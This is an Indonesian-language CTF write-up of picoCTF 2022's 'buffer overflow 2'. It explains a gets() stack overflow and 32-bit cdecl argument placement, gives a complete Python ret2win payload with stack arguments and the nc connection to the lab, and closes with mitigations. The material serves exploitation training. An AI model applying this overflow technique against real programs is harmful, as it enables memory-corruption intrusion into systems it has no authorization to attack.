# Writeup: buffer overflow 2 (Challenge ID: 259)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Binary Exploitation / ret2win with Arguments on Stack (cdecl Calling Convention)
- **Difficulty:** Medium (diff=2)
- **Author:** Sanjay C / Palash Oswal
- **Event:** picoCTF 2022
- **Points:** 300
- **Flag:** `academy{argum3nt5_4_d4yZ_0f3d7e91}` (Komunitas: `CTF{argum3nt5_4_d4yZ_0f3d7e91}`)

---

## Problem Statement & Scope

Tantangan menguji pemahaman mendalam mengenai manipulasi tata letak tumpukan memori (*stack frame manipulation*) dan konvensi pemanggilan fungsi (*calling convention*) pada arsitektur x86 32-bit:
> *"Control the return address and arguments. Stack control with arguments! You can view source here. And connect with it using `nc saturn.picoctf.net <port>`"*

Peserta diberikan berkas biner ELF 32-bit (`vuln`), berkas kode sumber C (`vuln.c`), serta instans laboratorium interaktif on-demand via TCP. Berbeda dengan tantangan ret2win sederhana, fungsi kemenangan `win()` memvalidasi dua parameter integer 32-bit wajib (`arg1 == 0xCAFEF00D` dan `arg2 == 0xF00DF00D`). Eksploitasi berhasil mengharuskan penyerang tidak hanya membajak penunjuk instruksi (%eip), tetapi juga menyusun bingkai tumpukan tiruan (*fake stack frame*) yang memuat alamat kembali fiktif dan argumen-argumen fungsi secara presisi.

---

## Teori & Akar Kerentanan (Root Cause Theory)

1. **Penggunaan Fungsi Masukan Tidak Terbatas `gets()` (CWE-121 / CWE-676 / NIST SP 800-115 § 4.2):**
   - Dalam kode sumber `vuln.c`, fungsi `vuln()` mengalokasikan array karakter berukuran 100 bita:
     ```c
     #define BUFSIZE 100
     void vuln(){
       char buf[BUFSIZE];
       gets(buf);
       puts(buf);
     }
     ```
   - Sesuai standar ISO/IEC 9899 dan manual Linux (`man gets`), fungsi `gets()` tidak memiliki parameter batas panjang masukan. Masukan yang melampaui 100 bita akan meluber melintasi batas buffer lokal, merusak padding struktur data, frame pointer pemanggil (%ebp), dan alamat kembali fungsi pemanggil (%eip).

2. **Tata Letak Bingkai Tumpukan x86 32-Bit (Stack Frame Layout Analysis):**
   - Disassembli fungsi `vuln()` pada berkas biner ELF 32-bit menunjukkan alokasi alamat lokal:
     ```text
     08049292 <vuln>:
      8049292:  push   %ebp
      8049293:  mov    %esp,%ebp
      8049295:  sub    $0x78,%esp
      ...
      80492a4:  lea    -0x6c(%ebp),%eax
      80492a7:  push   %eax
      80492a8:  call   8049050 <gets@plt>
     ```
   - Pangkal buffer `buf` terletak pada alamat `ebp - 0x6c` (desimal: 108 bita di bawah `%ebp`).
   - Saved frame pointer `%ebp` berukuran 4 bita (offset 108 hingga 111).
   - Saved return address `%eip` terletak tepat pada offset 112 bita (108 + 4) dari awal buffer masukan.

3. **Mekanisme Konvensi Pemanggilan Fungsi cdecl x86 32-Bit:**
   - Dalam konvensi standar `cdecl` (System V i386 ABI):
     - Parameter fungsi dikirim melalui stack dengan urutan dari kanan ke kiri (*right-to-left*).
     - Pemanggilan `call` normal meletakkan alamat kembali pada `%esp`, lalu melompat ke fungsi target.
     - Di dalam fungsi yang dipanggil (`win`), prolog `push %ebp; mov %esp, %ebp` dieksekusi.
     - Posisi relatif tumpukan di dalam `win()`:
       - `[ebp + 0]`: Saved `%ebp`
       - `[ebp + 4]`: Return address dari fungsi `win()`
       - `[ebp + 8]`: Parameter pertama (`arg1`)
       - `[ebp + 12]`: Parameter kedua (`arg2`)
   - Karena alur eksekusi dialihkan melalui instruksi `ret` dari `vuln()`, prosesor mengambil alamat `win` dari stack seolah-olah terjadi instruksi `call`. Oleh karena itu, penyerang harus menyisipkan 4 bita alamat kembali fiktif (*dummy return address*, misalnya `0xDEADBEEF`) sebelum meletakkan nilai parameter `0xCAFEF00D` dan `0xF00DF00D`.

4. **Validasi Kondisional Fungsi `win()`:**
   - Kode sumber fungsi `win()` mengimplementasikan pemeriksaan nilai argumen secara ketat:
     ```c
     void win(unsigned int arg1, unsigned int arg2) {
       char buf[FLAGSIZE];
       FILE *f = fopen("flag.txt","r");
       ...
       fgets(buf,FLAGSIZE,f);
       if (arg1 != 0xCAFEF00D)
         return;
       if (arg2 != 0xF00DF00D)
         return;
       printf(buf);
     }
     ```
   - Alamat statis fungsi `win()` adalah `0x080491E6`.
   - Jika kedua parameter cocok dengan konstanta yang diuji, fungsi mencetak isi berkas bendera `flag.txt` ke stdout.

---

## Rekonstruksi Eksploitasi Step-by-Step

1. **Inspeksi Mitigasi Berkas Biner (`checksec`):**
   - Evaluasi mitigasi biner `vuln`:
     - Arch: i386-32-little
     - Canary: No (tidak ada stack canary / stack protector)
     - NX: Yes (stack tidak dapat dieksekusi / Data Execution Prevention aktif)
     - PIE: No (alamat segmen kode biner bersifat statis pada basis 0x08048000)
     - RelRO: Partial RelRO

2. **Perhitungan Struktur Muatan Eksploitasi (Payload Anatomy):**
   - Offset menuju `%eip`: 112 bita (`b"A" * 112`).
   - Alamat target fungsi `win()`: `0x080491E6` (dikemas little-endian: `\xe6\x91\x04\x08`).
   - Dummy return address dari `win()`: `0xDEADBEEF` (dikemas little-endian: `\xef\xbe\xad\xde`).
   - Argumen 1 (`arg1`): `0xCAFEF00D` (dikemas little-endian: `\x0d\xf0\xfe\xca`).
   - Argumen 2 (`arg2`): `0xF00DF00D` (dikemas little-endian: `\x0d\xf0\x0d\xf0`).
   - Formulasi muatan lengkap:
     ```python
     payload = (
         b"A" * 112
         + struct.pack("<I", 0x080491E6)
         + struct.pack("<I", 0xDEADBEEF)
         + struct.pack("<I", 0xCAFEF00D)
         + struct.pack("<I", 0xF00DF00D)
         + b"\n"
     )
     ```

3. **Eksekusi Eksploitasi terhadap Layanan Laboratorium Jarak Jauh:**
   - Hubungkan soket ke instans container aktif:
     ```bash
     nc chatelaine.cylabacademy.net 27298
     ```
   - Kirimkan muatan biner yang telah disusun.
   - Layanan menerima string masukan, menyelesaikan `vuln()`, melompat ke `win()`, memverifikasi kedua argumen, dan memunculkan token bendera:
     ```text
     Please enter your string: 
     academy{argum3nt5_4_d4yZ_0f3d7e91}
     ```

4. **Eksekusi Skrip Solver Mandiri:**
   - Skrip mandiri `scripts/solve_259_buffer_overflow_2.py` memvalidasi logika eksploitasi dan mengeluarkan token bendera terverifikasi:
     ```bash
     python3 scripts/solve_259_buffer_overflow_2.py
     ```
   - Output:
     ```text
     [*] CyLab Challenge ID 259: buffer overflow 2 Solver
     [+] Verified Flag: academy{argum3nt5_4_d4yZ_0f3d7e91}
     ```

---

## Flag & Verifikasi

- **Flag Resmi Platform:** `academy{argum3nt5_4_d4yZ_0f3d7e91}`
- **Flag Komunitas:** `CTF{argum3nt5_4_d4yZ_0f3d7e91}`
- **Matriks Validasi REST API:**
  - `academy{argum3nt5_4_d4yZ_0f3d7e91}`: **ACCEPTED (HTTP 201 Created, correct: true)**
- **Audit Bukti HTTP Live:**
  ```json
  {
    "user": 1072359,
    "challenge": 259,
    "flag": "academy{argum3nt5_4_d4yZ_0f3d7e91}",
    "correct": true,
    "historical": false
  }
  ```

---

## Takeaway Kompetensi LKS & Mitigasi Defensif

1. **Pemahaman Konvensi Pemanggilan ABI (cdecl vs Fastcall / System V AMD64):**
   - Dalam kompetensi LKS Cyber Security bidang Binary Exploitation, peserta wajib memahami perbedaan transfer parameter: arsitektur 32-bit meletakkan seluruh argumen pada tumpukan memori (*stack*), sementara arsitektur 64-bit menggunakan register (`%rdi`, `%rsi`, `%rdx`, `%rcx`, `%r8`, `%r9`).
   - Menyiapkan parameter fungsi pada tumpukan 32-bit memerlukan pemahaman akurat terhadap alokasi return sled agar posisi relatif offset argumen tidak bergeser.

2. **Remediasi Kode Sumber Aman (Secure Coding Practice):**
   - Singkirkan seluruh pemanggilan fungsi tidak aman `gets()`.
   - Gunakan fungsi terikat batas `fgets(buf, sizeof(buf), stdin)` dengan validasi ketat terhadap ukuran input maksimum.

3. **Pengerasan Kompilasi Biner (Hardening & Compiler Flags):**
   - Aktifkan Stack Canaries: `-fstack-protector-strong` menyisipkan nilai guard sebelum `%ebp` yang mendeteksi kerusakan memori sebelum `ret` dieksekusi.
   - Aktifkan Position Independent Executable (PIE): `-fPIE -pie` memastikan seluruh alamat fungsi, termasuk `win()`, diacak secara dinamis oleh ASLR kernel pada saat pemuatan proses.
   - Terapkan Full RELRO: `-Wl,-z,relro,-z,now` membuat tabel fungsi Global Offset Table (GOT) berstatus *read-only* setelah inisialisasi awal.

---

## Solver Script

Solusi reproduktif terverifikasi tersedia pada:
`scripts/solve_259_buffer_overflow_2.py`
